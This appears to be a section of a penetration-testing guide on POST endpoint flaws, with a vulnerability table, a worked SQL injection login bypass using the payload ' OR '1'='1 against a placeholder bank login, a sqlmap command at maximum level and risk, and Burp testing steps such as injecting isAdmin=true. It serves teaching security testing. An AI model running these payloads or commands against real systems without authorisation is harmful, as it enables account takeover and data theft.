## 🛠️ Case 2: `POST` Endpoints – Form/Data Submission

### 1. Common Vulnerabilities

| Vulnerability                     | Description                                                            | Example Endpoint                |
|-----------------------------------|------------------------------------------------------------------------|---------------------------------|
| **SQL Injection (CWE‑89)**        | Malicious SQL in form field alters database query                      | `/login`, `/search`, `/comment` |
| **CSRF (CWE‑352)**                | Forged form submission from attacker’s site                            | `/transfer`, `/reset-password`  |
| **Broken Authentication**         | Weak password handling, enumeration, brute‑force                       | `/login`, `/register`           |
| **Mass Assignment (CWE‑MassAssn)**| Unfiltered object properties allow setting unintended fields           | `/user/update`, `/profile`      |
| **Insecure File Upload (CWE‑434)**| Upload form allowing dangerous files (e.g. `.php`, `.jsp`)             | `/upload-avatar`, `/submit-doc` |
| **Command Injection (CWE‑78/77)** | Form input passed to OS commands without sanitization                  | `/support/ticket`, `/scan`      |
| **Business Logic Flaws**          | E.g., transferring more funds than available, missing server‑side checks | `/transfer/funds`               |

---

### 2. Detailed Example – SQL Injection in a Login Form

#### 🔍 **Vulnerable Endpoint**
```
POST https://bank.example.com/login
Content-Type: application/x-www-form-urlencoded

username=alice&password=secret123
```

#### 💉 **Injection Payload**
- **Username:** `' OR '1'='1`
- **Password:** `anything`

Full body:
```
username=' OR '1'='1&password=foo
```

#### 🏃 **What Happens?**
The server might build a query like:
```sql
SELECT * FROM users 
 WHERE username = '' OR '1'='1'
   AND password = 'foo';
```
Because `'1'='1'` is always true, the query returns the first user (often an admin), logging you in without valid creds.

#### 🛠️ **Testing with SQLMap**
```bash
sqlmap -u "https://bank.example.com/login" \
  --data="username=alice&password=secret123" \
  --batch --level=5 --risk=3
```
This automates detection & exploitation.

---

### 3. Real-World Use Cases

| Endpoint Type  | Examples                            | Why It Matters                                               |
|---------------|-------------------------------------|--------------------------------------------------------------|
| **Login Forms**      | `/login`, `/api/authenticate`      | Credentials, sessions—critical auth barrier                  |
| **Registration**     | `/register`, `/signup`             | New user creation—watch for mass assignment                  |
| **Funds Transfer**   | `/transfer/imps`, `/transfer/neft` | High-impact CSRF or logic flaws can steal money             |
| **Profile Updates**  | `/user/update`, `/change-password` | Mass assignment or broken auth can tweak admin flags         |
| **File Upload**      | `/upload-avatar`, `/submit-doc`    | RCE if `.php`/`.jsp` allowed—validate file type & size       |
| **Support Tickets**  | `/support/ticket`                  | Command injection if ticket content passed to scripts       |

---

### 🎯 Quick Manual Testing Steps

1. **Intercept the POST** in Burp Suite Repeater.  
2. **Modify parameters**:
   - SQLi payloads (`' OR '1'='1`)
   - CSRF: Remove or change CSRF token  
   - Mass Assignment: Add extra fields (`isAdmin=true`)  
3. **Send & Observe**:
   - HTTP status codes  
   - Response bodies (error messages, redirect to dashboard)  
4. **Automate** with tools:
   - `sqlmap` for SQLi  
   - Burp CSRF scanner or Forge plugin for CSRF  

---

